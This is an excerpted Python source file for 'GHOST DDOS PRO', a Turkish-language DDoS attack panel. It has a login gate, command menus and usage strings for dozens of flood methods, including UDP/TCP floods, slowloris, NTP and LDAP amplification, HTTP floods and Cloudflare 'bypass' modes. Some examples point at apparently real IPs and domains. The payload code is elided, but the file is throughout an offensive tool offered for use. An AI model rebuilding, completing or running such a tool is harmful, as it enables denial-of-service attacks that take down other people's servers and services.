...
def si():
    print('GHOST DDOS PRO | Komutları Görmek İçin | help Yaz |')
    print("")
...
def menu():
    sys.stdout.write(f"         \x1b]2;Ghost DDoS --> Botlar: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07 | Maded By: !       Є₵ЄŁ ` Minecraft#7688")
    clear()
    print("GHOST DDOS PRO | help Yaz Brom | Destroyer.#7688 Sunar")
    print("")
    time.sleep(2)

print("   _____  _    _   ____    _____  _______   _____   _____    ____    _____ ")
print("  / ____|| |  | | / __ \  / ____||__   __| |  __ \ |  __ \  / __ \  / ____| ")
print(" | |  __ | |__| || |  | || (___     | |    | |  | || |  | || |  | || (___  ")
print(" | | |_ ||  __  || |  | | \___ \    | |    | |  | || |  | || |  | | \___ \  ")
print(" | |__| || |  | || |__| | ____) |   | |    | |__| || |__| || |__| | ____) | ")
print("  \_____||_|  |_| \____/ |_____/    |_|    |_____/ |_____/  \____/ |_____/ ")
...
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[ghost\x1b[38;2;0;186;45m 💀ddos\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7" or cnc == "Layer7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4" or cnc == "Layer4":
            layer4()
...
# LAYER 4 METHODS   
            ...
            try:
                ...
                print('Kullanimi: udpbypass <ip> <port>')
                print('Ornek: udpbypass 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: stdv2 <ip> <port>')
                print('Ornek: stdv2 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: flux <ip> <port> <threads>')
                print('Ornek: flux 1.1.1.1 80 250')
            ...
            try:
                ...
                print('Kullanimi: slowloris <ip> <port>')
                print('Ornek: slowloris 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: god <ip> <port> <time>')
                print('Ornek: god 1.1.1.1 80 60')
            ...
            try:
                ...
                print('Kullanimi: destroy <ip> <port> <time>')
                print('Ornek: destroy 1.1.1.1 80 60')
            ...
            try:
                ...
                print('Kullanimi: std <ip> <port>')
                print('Ornek: std 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: home <ip> <port> <packet_size> <time>')
                print('Ornek: home 1.1.1.1 80 65500 60')
            ...
            try:
                ...
                print('Kullanimi: udp <ip> <port>')
                print('Ornek: udp 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: nfo-killer <ip> <port> <threads> <time>')
                print('Ornek: nfo-killer 1.1.1.1 80 850 60')
            ...
            try:
                ...
                print('Kullanimi: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Ornek: ovh-raw GET 1.1.1.1 80 60 8500')
            ...
            try:
                ...
                print('Kullanimi: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Ornek: tcp GET 1.1.1.1 80 60 8500')
...
# SPECIAL METHODS
            ...
            try:
                ...
                print('Kullanimi: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Ornek: stress 1.1.1.1 80 3 1250 60 5')
...
# AMP/GAMES METHODS
            ...
            try:
                ...
                print('Kullanimi: samp <ip> <port>')
                print('Ornek: samp 1.1.1.1 7777')
            ...
            try:
                ...
                print('Kullanimi: ldap <ip> <port> <threads> <time>')
                print('Ornek: ldap 1.1.1.1 80 650 60')
            ...
            try:
                ...
                print('Kullanimi: minecraft <ip> <throttle> <threads> <time>')
                print('Ornek: minecraft 1.1.1.1 5000 500 60')
            ...
            try:
                ...
                print('Kullanimi: ovh-amp <ip> <port>')
                print('Ornek: ovh-amp 1.1.1.1 80')
            ...
            try:
                ...
                print('Kullanimi: ntp <ip> <port> <throttle> <time>')
                print('Ornek: ntp 1.1.1.1 22 250 60')
...
# LAYER 7 METHODS
            ...
            try:
                ...
                print('Kullanimi: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Ornek: ovh-beam GET 51.38.92.223 80 60')
            ...
            try:
                ...
                print('Kullanimi: https-spoof <url> <time> <threads>')
                print('Ornek: https-spoof http://vailon.com 60 500')
            ...
            try:
                ...
                print('Kullanimi: slow <url> <time>')
                print('Ornek: slow http://vailon.com 60')
            ...
            try:
                ...
                print('Kullanimi: hyper <url> <time>')
                print('Ornek: hyper http://vailon.com 60')
            ...
            try:
                ...
                print('Kullanimi: http-socket <url> <per> <time>')
                print('Ornek: http-socket http://Ornek.com 5000 60')
            ...
            try:
                ...
                print('Kullanimi: http-raw <url> <time>')
                print('Ornek: http-raw http://Ornek.com 60')
            ...
            try:
                ...
                print('Kullanimi: http-requests <url> <time>')
                print('Ornek: http-requests http://Ornek.org 60')
            ...
            try:
                ...
                print('Kullanimi: http-rand <url> <time>')
                print('Ornek: http-rand http://vailon.com/ 60')
            ...
            try:
                ...
                print('Kullanimi: overflow <ip> <port> <threads>')
                print('Ornek: overflow 1.1.1.1 80 5000')
            ...
            try:
                ...
                print('Kullanimi: cf-bypass <url> <time> <threads>')
                print('Ornek: cf-bypass http://Ornek.com 60 1250')
            ...
            try:
                ...
                print('Kullanimi: uambypass <url> <time> <req_per_ip>')
                print('Ornek: uambypass http://Ornek.com 60 1250')
            ...
            try:
                ...
                print('Kullanimi: crash <url> METHODS<GET/POST>')
                print('Ornek: crash http://Ornek.com GET')
            ...
            try:
                ...
                print('Kullanimi: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Ornek: httpflood http://Ornek.com 15000 get 60')
            ...
            try:
                ...
                print('Kullanimi: httpget <url>')
                print('Ornek: httpget http://Ornek.com')
...
# TOOLS
            ...
            try:
                ...
                print('Kullanimi: geoip <ip>')
                print('Ornek: geoip 1.1.1.1')
            ...
            try:
                ...
                print('Kullanimi: reverseip <ip>')
                print('Ornek: reverseip 1.1.1.1')
            ...
            try:
                ...
                print('Kullanimi: subnet-lookup <cdr/ip + netmask>')
                print('Ornek: subnet-lookup 192.168.1.0/24')
            ...
            try:
                ...
                print('Kullanimi: asn-lookup <ip/asn>')
                print('Ornek: asn-lookup AS15169')
            ...
            try:
                ...
                print('Kullanimi: dns-lookup <dns>')
                print('Ornek: dns-lookup google.com')
            ...
            try:
                ...
                print('Kullanimi: reverse-dns <ip/domain>')
                print('Ornek: reverse-dns 8.8.8.8')                
            ...
            print(f'''
LAYER7  ►  LAYER7 METHODS GÖSTERİR
LAYER4  ►  LAYER4 METHODS GÖSTERİR
AMP     ►  AMP METHODS GÖSTERİR
SPECIAL ►  SPECIAL METHODS GÖSTERİR
BANNERS ►  BANNERS GÖSTERİR
PORTS   ►  ALL PORTS GÖSTERİR 
TOOLS   ►  TOOLS GÖSTERİR
CLEAR   ► TERMİNAL TEMİZLER 
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Komut: [ " + cmmnd + " ] Adlı Komut Bulunamadı!")
            except IndexError:
                pass
...
def login():
    ...
    if username != user or password != passwd:
        print("")
        print("⚡ OLM Kullanıcı İsim Ve Şifre Ghost :d")
        sys.exit(1)
    elif username == user and password == passwd:
        print("GHOST DDoS PRO | Ghost Güvencesi İle Brom")
        time.sleep(2)
        ascii_vro()
        main()
